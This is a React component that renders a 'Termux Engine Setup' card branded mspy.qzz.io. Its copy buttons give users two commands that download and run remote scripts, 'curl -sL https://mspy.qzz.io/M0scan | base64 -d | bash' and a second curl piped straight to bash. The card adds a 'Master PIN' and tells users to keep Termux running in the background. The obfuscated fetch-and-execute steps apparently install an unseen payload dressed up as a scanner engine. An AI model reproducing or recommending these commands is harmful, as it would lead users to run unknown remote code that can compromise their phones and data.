import React, { useState } from 'react';
import { motion } from 'framer-motion';
import { Terminal, Copy, Check, Zap } from 'lucide-react';

function CopyButton({ text }) {
  const [copied, setCopied] = useState(false);
  const handle = () => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };
  return (
    <button
      onClick={handle}
      className={`flex items-center gap-1.5 text-xs font-bold px-3 py-1.5 rounded-lg border transition-all flex-shrink-0 ${
        copied
          ? 'bg-green-500/20 text-green-400 border-green-500/40'
          : 'bg-gray-700/60 hover:bg-gray-600/60 text-gray-300 border-gray-600/40'
      }`}
    >
      {copied ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
      {copied ? 'Copied!' : 'Copy'}
    </button>
  );
}

export default function GodCommandCard() {
  return (
    <motion.div
      initial={{ opacity: 0, y: 16 }}
      animate={{ opacity: 1, y: 0 }}
      className="rounded-2xl border border-cyan-500/30 bg-gradient-to-br from-gray-900/90 to-[#0a0a0f]/90 backdrop-blur-xl overflow-hidden"
    >
      {/* Header */}
      <div className="px-5 pt-5 pb-4 border-b border-gray-700/50">
        <div className="flex items-center gap-3 mb-1">
          <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-cyan-500 to-blue-600 flex items-center justify-center flex-shrink-0 shadow-lg shadow-cyan-500/20">
            <Terminal className="w-5 h-5 text-white" />
          </div>
          <div>
            <h3 className="font-bold text-white text-sm leading-tight">Termux Engine Setup</h3>
            <p className="text-[11px] text-cyan-400 font-mono">mspy.qzz.io</p>
          </div>
          <div className="ml-auto flex items-center gap-1.5 bg-cyan-500/10 border border-cyan-500/30 rounded-full px-2.5 py-1">
            <span className="w-1.5 h-1.5 bg-cyan-400 rounded-full animate-pulse" />
            <span className="text-[10px] font-bold text-cyan-400 uppercase tracking-wider">Elite</span>
          </div>
        </div>
        <p className="text-xs text-gray-400 mt-2">Deploy the secure core engine, then link it to the app.</p>
      </div>

      <div className="px-5 py-5 space-y-6">

        {/* ── STEP 1 ── */}
        <div>
          <div className="flex items-center gap-2 mb-3">
            <span className="w-6 h-6 rounded-full bg-gradient-to-br from-cyan-500 to-blue-600 flex items-center justify-center text-[11px] font-bold text-white flex-shrink-0">1</span>
            <p className="text-sm font-bold text-white">Install M@☆ Core Engine</p>
          </div>

          {/* Command block */}
          <div className="bg-gray-950/80 border border-gray-700/50 rounded-xl overflow-hidden mb-3">
            <div className="flex items-center justify-between px-3 py-2 border-b border-gray-800/60 bg-gray-900/60">
              <span className="text-[10px] font-mono text-gray-500">bash</span>
              <CopyButton text="curl -sL https://mspy.qzz.io/M0scan | base64 -d | bash" />
            </div>
            <div className="px-4 py-3">
              <code className="text-xs text-green-300 font-mono break-all leading-relaxed">
                curl -sL https://mspy.qzz.io/M0scan | base64 -d | bash
              </code>
            </div>
          </div>

          {/* PIN Badge */}
          <motion.div
            animate={{ boxShadow: ['0 0 8px rgba(251,191,36,0.2)', '0 0 18px rgba(251,191,36,0.4)', '0 0 8px rgba(251,191,36,0.2)'] }}
            transition={{ duration: 2, repeat: Infinity }}
            className="flex items-center gap-3 bg-amber-500/10 border border-amber-500/40 rounded-xl px-4 py-3"
          >
            <span className="text-xl flex-shrink-0">🔑</span>
            <div>
              <p className="text-xs text-amber-300/80 font-medium mb-0.5">Master PIN Required</p>
              <p className="text-2xl font-black text-amber-400 tracking-[0.3em] font-mono">202614</p>
            </div>
            <p className="text-[10px] text-amber-300/60 leading-tight ml-auto text-right max-w-[90px]">Enter this when Termux asks for PIN</p>
          </motion.div>
        </div>

        {/* Divider */}
        <div className="flex items-center gap-3">
          <div className="flex-1 h-px bg-gray-800" />
          <Zap className="w-3.5 h-3.5 text-cyan-500/50" />
          <div className="flex-1 h-px bg-gray-800" />
        </div>

        {/* ── STEP 2 ── */}
        <div>
          <div className="flex items-center gap-2 mb-3">
            <span className="w-6 h-6 rounded-full bg-gradient-to-br from-purple-500 to-blue-600 flex items-center justify-center text-[11px] font-bold text-white flex-shrink-0">2</span>
            <p className="text-sm font-bold text-white">Launch App Bridge</p>
          </div>

          <div className="bg-gray-950/80 border border-gray-700/50 rounded-xl overflow-hidden">
            <div className="flex items-center justify-between px-3 py-2 border-b border-gray-800/60 bg-gray-900/60">
              <span className="text-[10px] font-mono text-gray-500">bash</span>
              <CopyButton text="curl -sL https://mspy.qzz.io/deovexm0scan | bash" />
            </div>
            <div className="px-4 py-3">
              <code className="text-xs text-purple-300 font-mono break-all leading-relaxed">
                curl -sL https://mspy.qzz.io/deovexm0scan | bash
              </code>
            </div>
          </div>
        </div>

        {/* Divider */}
        <div className="flex items-center gap-3">
          <div className="flex-1 h-px bg-gray-800" />
          <Zap className="w-3.5 h-3.5 text-cyan-500/50" />
          <div className="flex-1 h-px bg-gray-800" />
        </div>

        {/* ── STEP 3 ── */}
        <div className="flex items-start gap-3 bg-green-500/8 border border-green-500/25 rounded-xl px-4 py-3">
          <span className="w-6 h-6 rounded-full bg-gradient-to-br from-green-500 to-emerald-600 flex items-center justify-center text-[11px] font-bold text-white flex-shrink-0 mt-0.5">3</span>
          <p className="text-sm text-green-300 font-semibold leading-snug">Keep Termux open in the background and return here.</p>
        </div>

        {/* Footer hint */}
        <div className="flex items-center gap-2 bg-gray-800/40 border border-gray-700/30 rounded-xl px-3 py-2.5">
          <span className="w-2 h-2 bg-green-400 rounded-full animate-pulse flex-shrink-0" />
          <p className="text-[11px] text-gray-400">The Scanner tab will show <span className="text-green-400 font-bold">🟢 Termux Engine Online</span> once connected.</p>
        </div>

      </div>
    </motion.div>
  );
}